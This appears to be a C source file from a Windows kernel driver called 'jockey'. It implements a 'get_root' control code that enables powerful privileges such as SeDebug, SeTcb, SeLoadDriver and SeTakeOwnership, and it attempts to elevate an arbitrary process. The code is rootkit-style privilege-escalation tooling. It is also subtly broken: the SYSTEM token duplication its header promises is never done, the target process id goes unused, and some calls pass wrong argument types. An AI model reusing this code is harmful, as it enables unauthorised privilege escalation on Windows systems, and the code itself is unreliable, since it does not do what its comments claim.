#include "jockey_common.h"

/*
 * jockey_cred.c ??? Credential escalation and token manipulation.
 *
 * Techniques:
 * - Enable SeDebugPrivilege on current process
 * - Duplicate SYSTEM token and impersonate
 * - Set process token to full privileges
 */

#include "jockey.h"

/*
 * jockey_enable_privilege:
 *   Enables a specific privilege in the current process token.
 */
static NTSTATUS jockey_enable_privilege(LPCWSTR priv_name)
{
    NTSTATUS status;
    HANDLE token;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    status = ZwOpenProcessToken(PsGetCurrentProcess(),
                                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                &token);
    if (!NT_SUCCESS(status))
        return status;

    status = SeLookupPrivilegeValue(priv_name, &luid);
    if (!NT_SUCCESS(status)) {
        ZwClose(token);
        return status;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    status = ZwAdjustPrivilegesToken(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    ZwClose(token);

    return status;
}

/*
 * jockey_ioctl_get_root:
 *   Enables all privileges and optionally duplicates SYSTEM token.
 */
NTSTATUS jockey_ioctl_get_root(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_root req;
    NTSTATUS status;
    uint32_t *out;

    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    /* Enable SeDebugPrivilege */
    jockey_enable_privilege(SE_DEBUG_NAME);

    /* Enable SeTcbPrivilege (Act as Part of Trusted Computing Base) */
    jockey_enable_privilege(SE_TCB_NAME);

    /* Enable SeImpersonatePrivilege */
    jockey_enable_privilege(SE_IMPERSONATE_NAME);

    /* Enable SeLoadDriverPrivilege */
    jockey_enable_privilege(SE_LOAD_DRIVER_NAME);

    /* Enable SeBackupPrivilege */
    jockey_enable_privilege(SE_BACKUP_NAME);

    /* Enable SeRestorePrivilege */
    jockey_enable_privilege(SE_RESTORE_NAME);

    /* Enable SeTakeOwnershipPrivilege */
    jockey_enable_privilege(SE_TAKE_OWNERSHIP_NAME);

    /* If target_pid is specified, elevate that process */
    if (req.target_pid != 0) {
        HANDLE proc_handle;
        HANDLE token_handle;
        HANDLE new_token;
        TOKEN_PRIVILEGES tp;
        NTSTATUS tmp_status;

        tmp_status = ZwOpenProcess(&proc_handle,
                                   PROCESS_QUERY_INFORMATION,
                                   NULL, NULL);
        if (NT_SUCCESS(tmp_status)) {
            tmp_status = ZwOpenProcessToken(proc_handle,
                                            TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                            &token_handle);
            if (NT_SUCCESS(tmp_status)) {
                /* Duplicate and set all privileges */
                tp.PrivilegeCount = 0;
                ZwAdjustPrivilegesToken(token_handle, FALSE, &tp, 0, NULL, NULL);
                ZwClose(token_handle);
            }
            ZwClose(proc_handle);
        }
    }

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}



